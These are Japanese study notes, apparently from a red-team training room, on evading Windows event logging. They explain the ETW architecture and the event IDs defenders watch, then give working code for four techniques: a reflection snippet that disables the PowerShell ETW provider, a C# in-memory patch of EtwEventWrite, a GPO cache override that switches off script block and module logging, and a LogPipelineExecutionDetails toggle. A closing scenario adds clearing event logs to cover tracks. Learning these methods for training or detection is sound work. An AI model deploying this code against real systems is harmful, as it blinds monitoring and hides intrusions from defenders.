## Intro

- 攻撃者の進路を阻む最大の障害の1つは、ロギングとモニタリング。
- AVやEDRソリューションとは異なり、ロギングは悪意のある活動を分析できる活動の物理的な記録を作成する。  
  
- デバイスをどのように監視するかは、企業の環境や好みによって異なる。
- チームは、一部のデバイスをまったく監視しないと決定することもできる。
- 一般的に、モニタリング・ソリューションはホスト・デバイスから開始し、アプリケーション・ログやイベント・ログを収集する。
- ログが作成されると、それらはデバイス上に保持されるか、イベントコレクタ/フォワーダに送信される。
- デバイスからログが取り除かれると、防御チームはそれらをどのように集約するかを決定する。これは一般的に、インデクサとSIEMを使用する
![](../../../画像ファイル/Pasted%20image%2020230623105137.png)
- 攻撃者は、ログがデバイスから取り出されると、あまりコントロールできないかもしれないが、デバイス上に何があり、どのように取り込まれるかはコントロールできる。攻撃者の主な標的は、ETW（Event Tracing for Windows）によって管理・制御されるイベントログである。

##  Event Tracing

- 前述したように、Windows内のほぼすべてのイベントロギング機能は、アプリケーションとカーネルレベルの両方でETWから処理される。
- イベントロギングやトレースロギングのような他のサービスもあるが、これらはETWの拡張であるか、攻撃者にとってあまり一般的ではない

|Component|Purpose|
|---|---|
|Controllers|セッションの構築と設定|
|Providers|イベントの生成|
|Consumers|イベントの解釈|
- 各コンポーネントとその計測方法については、次のタスクで詳しく説明する。  
  
- 攻撃者にとってコンポーネントほど重要ではないが、イベントIDはWindowsロギングの中核機能である。イベントはXML(Extensible Markup Language)フォー マットで送られ、転送される。以下はイベントID 4624の例である。
```jsx
Event ID:4624
Source:Security
Category:Logon/Logoff
Message:An account was successfully logged on.

Subject:
Security ID: NT AUTHORITY\\SYSTEM
Account Name: WORKSTATION123$
...
[ snip ]
...
Logon Type: 7

New Logon:
Security ID: CORPDOMAIN\\john.doe
Account Name: john.doe
...
[ snip ]
...
Process Information:
Process ID: 0x314
```
- この時点で、なぜロギングが攻撃者を混乱させることができるのか理解できたが、ETWは攻撃者にとって具体的にどのように関係するのか？
- ETWはOSの大部分を可視化しますが、ロギングは一般的に可視性や詳細が限られている。  
  
- ETWは可視性があるため、攻撃者は操作の実行時に生成される可能性のあるイベントに常に注意を払う必要がある。
- ETWを停止させる最善の方法は、環境の完全性を維持しながら、攻撃者が行っている具体的な作業に対するETWの洞察を可能な限り制限すること

## Approaches to Log Evasion

- より現代的で技術的な回避テクニックを深く掘り下げる前に、利用可能な様々なアプローチと、攻撃者と防御者に与える影響について見てみる。  

- セキュリティのベストプラクティスに従えば、ログ転送を採用するのが最新の環境では一般的。
- ログ転送とは、SOCがホストマシンから中央サーバまたはインデクサにログを移動または「転送」することを意味する。
- 攻撃者がホストマシンからログを削除できたとしても、ログはすでにデバイスから取り除かれ、保護されている可能性がある。  
  
- 攻撃者がログを転送する前にすべて破壊したと仮定した場合、あるいはログが転送されなかったと仮定した場合、どのように警告を発するのか？
- 攻撃者は、まず環境の完全性を考慮しなければならない。デバイスからログが発信されていない場合、重大な疑惑が生じ、調査につながる可能性がある。仮に攻撃者がログの削除や転送を制御していたとしても、防御者は改ざんを追跡することができる。

|Event ID|Purpose|
|---|---|
|1102|Windowsセキュリティ監査ログがクリアされたときのログ|
|104|ログファイルがクリアされたときのログ|
|1100|Windowsイベントログサービスがシャットダウンされたときのログ|
- 上記のイベントIDは、ログの破壊、あるいは "ログの粉砕 "のプロセスを監視することができる。
- これはログの改ざんや破壊を試みる攻撃者に明確なリスクをもたらす。
- これらの緩和策をさらに迂回したり、ログを改ざんしたりすることは可能であるが、攻撃者はそのリスクを評価しなければならない。
- ある環境に近づくとき、攻撃者は一般的にセキュリティ慣行を知らないので、このアプローチを試みることによってOPSEC（運用セキュリティ）のリスクを負うことになる。  
  
- これまでのアプローチが攻撃的すぎるのであれば、どのように戦略的にアプローチすればよいのか？  
- 攻撃者は、環境の完全性を維持するために、悪意のあるテクニックがどのようなログをもたらす可能性があるかに注目しなければならない。
- 攻撃者は、自分に対して何が計測されるかを知ることで、公開されている手法を利用したり、修正したりすることができる。  
  
- 公開されている手法のほとんどは、ETWコンポーネントをターゲットにしたもの

##  Tracing Instrumentation

- ETWは3つの別々のコンポーネントに分かれており、連携してデータを管理・相関させる。
- Windowsのイベントログは、一般的なXMLデータと変わらないため、処理と解釈が容易。  
  
- イベントコントローラーは、セッションを構築し設定するために使用される。この定義を拡張するために、コントローラーは、データがどこにどのように流れるかを決定するアプリケーションと考えることができる。コントローラは、ログファイルのサイズと場所を定義し、イベントトレースセッションを開始、停止し、プロバイダがセッションにイベントをログできるようにし、バッファプールのサイズを管理し、セッションの実行統計を取得するアプリケーション
  
- イベントプロバイダーは、イベントを生成するために使用される。この定義を拡大すると、コントローラはプロバイダに操作方法を指示し、指定されたソースからログを収集する。プロバイダーは、イベントトレース装備を含むアプリケーション。プロバイダがそれ自身を登録した後、コントローラはプロバイダのイベントトレースを有効または無効にすることができる。プロバイダは、有効または無効の解釈を定義する。一般的に、有効なプロバイダはイベントを生成し、無効なプロバイダはイベントを生成しない。  
  
- また、様々な機能やレガシーシステムをサポートする4種類のプロバイダーがある。

|Provider|Purpose|
|---|---|
|MOF (Managed Object Format)|MOF クラスからのイベントを定義する。一度に1つのトレースセッションで有効。|
|WPP (Windows Software Trace Preprocessor)| [TMF](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[(](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[T](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[race](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) [M](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[essage](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) [F](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[ormat)](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)ファイルに関連付けられ、情報をデコードする。一度に1つのトレースセッションで有効。|
|Manifest-Based|マニフェストからのイベントを定義する。一度に最大 8 つのトレース・セッションで有効。|
|TraceLogging|すべての必要な情報を含む自己記述イベント。一度に最大8つのトレースセッションで有効。|

- イベントコンシューマーは、イベントを解釈するために使用される。この定義を拡張すると、コンシューマはセッションを選択し、そのセッションまたは複数のイベントを同時に解析する。これは、"Event Viewer "で最もよく見られる。コンシューマーは、イベントのソースとして1つ以上のイベントトレースセッションを選択するアプリケーション。コンシューマーは、複数のイベントトレースセッションから同時にイベントをリクエストすることができる。コンシューマは、ログファイルに保存されたイベント、またはリアルタイムでイベントを配信するセッションからイベントを受け取ることができる。
  
- これらの各コンポーネントは、ETW内のデータ/セッションの流れを完全に理解し、描写するために、まとめる
![](../../../画像ファイル/Pasted%20image%2020230623110452.png)
- 最初から最後まで、イベントはプロバイダーから発信される。コントローラーは、データがどこに送られ、セッションを通じてどのように処理されるかを決定する。コンシューマーは、解釈または分析されるログを保存または配信する。  
  
- ETWがどのように装備されるかを理解したところで、これを攻撃者にどのように適用するのか？
- 完全性を維持しながら可視性を制限するという目標。データフローの大部分を維持しながら、コンポーネントをターゲットにすることで、特定の側面を制限することができる。

##  Reflection for Fun and Silence

- PowerShell 内では、ETW プロバイダは .NET アセンブリからセッションにロードされる：`PSEtwLogProvider`。
- アセンブリは、.NETベースのアプリケーションの展開、バージョン管理、再利用、アクティベーションのスコープ、およびセキュリティ許可の基本単位を形成する。exe（実行ファイル）やdll（ダイナミックリンクライブラリ）のような馴染みのある形式で形作られている

- PowerShellセッションでは、ほとんどの.NETアセンブリが起動時にユーザーと同じセキュリティコンテキストでロードされる。
- セッションはロードされたアセンブリと同じ特権レベルを持っているので、PowerShellのリフレクションによってアセンブリのフィールドや値を変更することができる。
- リフレクションを使用すると、アセンブリの内部を見て、その特性を調べることができる。
- .NETアセンブリの内部には、アセンブリの内容を説明する情報が格納されている。これはメタデータと呼ばれる。.NETアセンブリは、ある意味で、少なくとも正しく質問されれば、自己記述することができる

- ETW（Event Tracing for Windows）のコンテキストでは、攻撃者はETWイベントプロバイダアセンブリを反映し、フィールド`m_enabled`を`$null`に設定できる
  
- おおまかに、PowerShellのリフレクションは3つのステップに分けることができる
	1. `PSEtwLogProvider` の .NET アセンブリを取得
	2. `etwProvider` フィールドに NULL 値を格納
	3. `m_enabled `フィールドを以前に格納した値に設定

1. `PSEtwLogProvider` アセンブリの型を取得する。このアセンブリは、次のステップで内部フィールドにアクセスするために格納される。
```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

2. 前のアセンブリーで使用した値（$null）を保存している。
```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

3. `m_enabled`フィールドを前の行に格納されている値で上書きするために、ステップをまとめる。
```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

- これらの手順をまとめて、悪意のあるPowerShellスクリプトに追加することができる。提供されているPowerShellスクリプトを使用して、このテクニックを試す。  
  
- スクリプトの有効性を証明するために、スクリプトを実行し、指定したコマンドから返されるイベントの数を測定する
![](../../../画像ファイル/Pasted%20image%2020230623111153.png)
![](../../../画像ファイル/Pasted%20image%2020230623111202.png)
- 最初のターミナルでは、whoamiコマンドが実行されると4つのイベントが発生するのが見える。2番目のターミナルでスクリプトが実行された後、コマンドの実行によって生成されたイベントはない。

## Patching Tracing Functions

- ETWは新しいプロセスのランタイムからロードされ、一般的にはCLR（Common Language Runtime）から発信される。
- 新しいプロセス内では、ETWイベントはuserlandから送信され、現在のプロセスから直接発行される。
- 攻撃者はETWのメモリ内関数にあらかじめ定義されたオペコードを書き込むことで、機能にパッチを当てたり無効にしたりすることができる。
- パッチがどのようなものかを大まかにで観察してみる。
- 最も基本的な定義では、パッチを当てたい関数に到達する前に、アプリケーションを強制的に終了させるか、リターンさせようとしている
  
- この概念をよりよく理解するために、数学演算を実行し、整数を返す基本的な擬似関数をみる。もしreturnが元のreturnの前に挿入されると、プログラムはそれ以降の行を完了しない。
```csharp
int x = 1
int y = 3
return x + y

// output: 4  
```

```csharp
int x = 1
return  x
int y = 3
return x + y

// output: 1 
```

- このハイレベルな概念を今回の目的に当てはめると、returnがメモリ上でどのように呼び出されるかを特定できれば、それを関数に書き込むことができ、他の行よりも先に実行されることが期待できる。
- スタックはLIFO（Last In First Out）構造を使用しているため、returnは一番上に配置されると予想される。
- 下の図は、LIFO構造がどのように機能するかの簡単な図である。LIFO構造がどのように動作するかについては、このタスクに深入りするにつれて詳しく説明する
![ 400](../../../画像ファイル/Pasted%20image%2020230623111709.png)
  
- return文とLIFO構造についてもう少し理解したところで、これがイベントトレースにどのように適用されるかに戻る。
- コードを書いたり、関数にパッチを当てるステップを特定したりする前に、悪意のある関数と戻り得るポイントを特定する必要がある。
- CLRからETWは関数`EtwEventWrite`から書かれていることが分かっている。パッチ・ポイントまたはリターンを特定するために、関数の逆アセンブルを見る
```wasm
779f2459 33cc		       xor	ecx, esp
779f245b e8501a0100	   call	ntdll!_security_check_cookie
779f2460 8be5		       mov	esp, ebp
779f2462 5d		         pop	ebp
779f2463 c21400		     ret	14h 
```
- 関数を観察するとき、関数をリターンさせるか、関数の実行を停止させるオペコードを探している。アセンブリ命令について調べたり慣れたりすることで、`ret 14h`が関数を終了させ、前のアプリケーションに戻ることがわかる
- ret命令は、スタック上のリターンアドレスに制御を移す。
- より専門的な言い方をすれば、ret はスタックに置かれた最後の値をポップする。ret のパラメータ (`14h`) は、スタックがポップされたときに解放されるバイト数またはワード数を指定する。  
  
- この関数を無効にするために、攻撃者は`ret14h`,` c21400`のオペコード・バイトをメモリに書き込み、この関数にパッチを当てることができる。  
  
- スタック上で何を達成しようとしているかをよりよく理解するために、このオペコードを先ほどの LIFO 図に当てはめることができる。
![ 400](../../../画像ファイル/Pasted%20image%2020230623111914.png)
- さて、このテクニックの基本を理解したところで、技術的な応用方法を見てみる。  
  
- ETWパッチは5つのステップに分けられる：
	1. EtwEventWriteのハンドルの取得  
	2. 関数のメモリ権限を変更する  
	3. オペコード・バイトをメモリに書き込む  
	4. 関数のメモリ権限をリセットする（オプション）  
	5. 命令キャッシュをフラッシュする（オプション）

1. `EtwEventWrite`のアドレスのハンドルを取得する必要がある。この関数は`ntdll`に格納されている。まず、`LoadLibrary`を使用してライブラリをロードし、次に`GetProcAddress`を使用してハンドルを取得する。
```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

2. 関数のメモリパーミッションを変更し、関数への書き込みを許可する必要がある。関数のパーミッションは`flNewProtect`パラメータで定義され、`0x40`でX、R、またはRWアクセス（[memory protection constraints](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)）が有効になる。
```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```

3. 関数は書き込みに必要なパーミッションを持っており、パッチを当てるための定義済みのオペコードを持っている。プロセスではなく関数に書き込むので、悪名高い`Marshal.Copy`を使ってオペコードを書き込むことができる。
```csharp
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```

4. メモリパーミッションを元通りにするためのクリーニングを始めることができる。
```csharp
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
```

5. パッチされた関数が命令キャッシュから実行されるようにする。
```csharp
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

- これらの手順をまとめて、悪意のあるスクリプトやセッションに追加することができる。
- オペコードがメモリに書き込まれた後、パッチを観察するために逆アセンブルされた関数を再び見ることができる
```wasm
779f23c0 c21400		    ret	14h
779f23c3 00ec		      add	ah, ch
779f23c5 83e4f8		    and	esp, 0FFFFFFF8h
779f23c8 81ece0000000	sub	esp, 0E0h
```

- 上記の分解では、まさにLIFO図（図2）で描いたものを見ることができる。    
- この関数がメモリ上にパッチされると、`EtwEventWrite`が呼び出されたときに必ず戻る
  
- 整合性のために必要以上のログを制限する可能性があるため、環境によっては最良のアプローチではないかもしれない

## Providers via Policy

ETWは、箱から出した状態では多くの機能をカバーしているが、ログを作成する量が多いため、指定しない限りいくつかの機能を無効にする。これらの機能は、親ポリシーのGPO（設定を変更することで有効にすることができる。
最も人気のある2つのGPOプロバイダーは、スクリプトブロックロギングとモジュールロギングを含むPowerShellのカバレッジを提供する。  
  
- スクリプト・ブロック・ロギングは、PowerShellセッション内で実行されたスクリプト・ブロックをログに記録する。PowerShell v4で導入され、PowerShell v5で改良されたETWプロバイダには、報告する2つのイベントIDがある。

|Event ID|Purpose|
|---|---|
|4103|コマンド起動のログ|
|4104|スクリプトブロックの実行ログ|

- イベントID 4104は攻撃者にとって最も一般的なものであり、適切に難読化または隠蔽されていない場合、攻撃者のスクリプトを暴露する可能性がある。
- 以下は、4104ログがどのように見えるかの短縮された例
```xml

Source:Microsoft-Windows-PowerShell
Category:Execute a Remote Command
Log:Microsoft-Windows-PowerShell/Operational
Message:Creating Scriptblock text (1 of 1):
Write-Host PowerShellV5ScriptBlockLogging

ScriptBlock ID: 6d90e0bb-e381-4834-8fe2-5e076ad267b3
Path:
```

- モジュールロギングは、非常に冗長なプロバイダで、そこから送信されたモジュールとデータをログに記録する。PowerShell v3 で導入され、PowerShell セッション内の各モジュールがプロバイダーとして動作し、それ自身のモジュールをログに記録する。以前のプロバイダーと同様に、モジュールはイベント ID 4103 にイベントを書き込む。
- 以下は、4103 ログがどのように見えるかの例。
```xml

Message:CommandInvocation(Write-Host): "Write-Host"

...
[snip]
...

```
- イベントID 4103は、作成されるログの量が多いため、攻撃者にはあまり浸透していない。そのため、多くの場合、深刻度は低く扱われるか、完全に無効化される。  
  
- 攻撃者はETWパッチを用意しているが、必ずしも実用的であるとは限らないし、ロギングを回避するための最良のアプローチとも限らない。
- 別の方法として、攻撃者はこれらのプロバイダーを標的にすることで、他のテクニックほど目立ったり騒がしくなったりすることなく、徐々に可視性を制限することができる。  
  
- これらのプロバイダーを無効にする一般的なゴールは、環境を改ざんされていないように見せかけながら、必要なコンポーネントの可視性を制限すること

## Group Policy Takeover

- モジュールロギングとスクリプトブロックロギングプロバイダーは、どちらもグループポリシー、特に`Administrative Templates -> Windows Components -> Windows PowerShell`から有効にする。
- PowerShell セッション内では、システムアセンブリはユーザーと同じセキュリティコンテキストでロードされる。
- これは、攻撃者が GPO 設定をキャッシュするアセンブリと同じ特権レベルを持つことを意味する。
- リフレクションを使用することで、攻撃者はユーティリティ辞書を取得し、いずれかのPowerShellプロバイダのグループポリシーを変更できる

- 大まかにグループポリシーの乗っ取りは3つのステップに分けられる：
	1. ユーティリティキャッシュからグループポリシー設定を取得
	2. 汎用プロバイダを`0`に変更
	3. 呼び出しまたはモジュール定義を修正

- PowerShellスクリプトの例を分解して各ステップを確認し、以下でそれぞれを詳しく説明する

1. リフレクションを使用して `System.Management.Automation.Utils `の型を取得し、GPO キャッシュ・フィールド `cachedGroupPolicySettings `を特定する
```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```

2. GPO変数を利用して、イベントプロバイダの設定を`0`に変更する。`EnableScriptBlockLogging`は4104イベントを制御し、スクリプト実行の可視性を制限する。変更は、オブジェクトまたはレジストリに直接書き込むことで実現できる。
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

3. `EnableScriptBlockInvocationLogging` は 4103 イベントを制御し、コマンドレットとパイプラインの実行の可視性を制限する
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```
- これらの手順をまとめて、悪意のあるPowerShellスクリプトに追加する。
- 提供されているPowerShellスクリプトを使用して、このテクニックを試す
  
- 注：スクリプトのコア機能は上記のコードと同じですが、PowerShell v.5.1のアップデートに準拠するように若干変更されている
  
- スクリプトの有効性を証明するために、スクリプトを実行し、指定されたコマンドから返されたイベントの数を測定する。
![](../../../画像ファイル/Pasted%20image%2020230623113541.png)
![](../../../画像ファイル/Pasted%20image%2020230623113550.png)
- 最初のターミナルでは、PowerShellスクリプトの実行時に3つのイベントが生成されている。2つ目のターミナルでは、スクリプトが実行された後、コマンドの実行によるイベントが生成されていないことがわかる

## Abusing Log Pipeline

- PowerShell 内では、各モジュールやスナップインには、誰でもそのロギング機能を変更するために使用できる設定がある。
- LogPipelineExecutionDetailsプロパティの値がTRUE（`$true`）の場合、Windows PowerShellはセッション内のコマンドレットと関数の実行イベントをイベントビューアのWindows PowerShellログに書き込む。
- 攻撃者は、任意のPowerShellセッションでこの値を`$false`に変更することで、その特定のセッションのモジュールのロギングを無効にすることができる。
- ロギングを無効にするには、同じコマンドシーケンスを使って、プロパティの値をFALSE（`$false`）に設定

- 大まかにログパイプライン技術は、4つのステップに分けることができる：
	1. ターゲットモジュールを取得する。  
	2. モジュール実行の詳細を`$false`に設定する。  
	3. モジュールのスナップインを取得する。  
	4. スナップインの実行詳細を`$false`に設定する。

```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```
- 上記のスクリプト・ブロックは、PowerShellスクリプトに追加したり、セッションで実行することで、現在インポートされているモジュールのモジュール・ロギングを無効にすることができる

## Real World Scenario

- このシナリオでは、あなたはレッドチームのオペレーターで、ETWを無効化し、コンパイルされたバイナリを実行するための回避スクリプトを構築するよう割り当てられている。
- このシナリオでは、環境の完全性が非常に重要であり、ブルーチームが積極的に環境を監視している。あなたのチームは、主にwebトラフィックを監視しているとあなたに伝えている。
- ブルーチームは疑わしいログも探していると思われるが、ログは転送していない。この部屋で得た知識を使って、干渉を受けずにバイナリまたはコマンドを実行するスクリプトを作成してください。

- このシナリオを始めるには、私たちが置かれている環境を考える必要がある。ウェブトラフィックを監視しているという情報は与えられているが、それをどのように実現しているのだろうか？PowerShellロギングを有効にしているのだろうか？Sysmonはインストールされているのか？これらの質問のほとんどは、手動で列挙するか、この部屋で議論したように機能を有効にする設定を探すことで答えられる。  
  
- いくつか列挙すれば、PowerShellスクリプトブロックとモジュールのロギングが有効になっていることを確認できる。この問題に対する最善の方法は、PowerShell セッションのキャッシュから両方の GPO 設定を無効にすること。
- これは、デスクトップにある GPO バイパスを使用することで実現できる
  
- しかし、スクリプトを実行したときに生成される厄介なログについてはどうか。
- 提供された情報から、ログが転送されていないことがわかったので、生成された4104または4103ログを削除できる。
- インターネット接続はPowerShellから発信されていないので、サイレントセッションで邪魔される心配はない。ログを削除するには、イベントビューア GUI または PowerShell の Remove-EventLog を使用する。PowerShellスクリプトブロックのログは、Microsoft/Windows/PowerShell/OperationalまたはMicrosoft-Windows-PowerShellにあります。その後、GUI のアクションでログのクリアを選択するか、PowerShell コマンドレットを実行して必要なログを削除する。  
  
- この時点で、すべてのパラメーターが満たされているはず：  
  
- 必要なログを無効にする  
- 環境の整合性の維持  
- 痕跡を消す
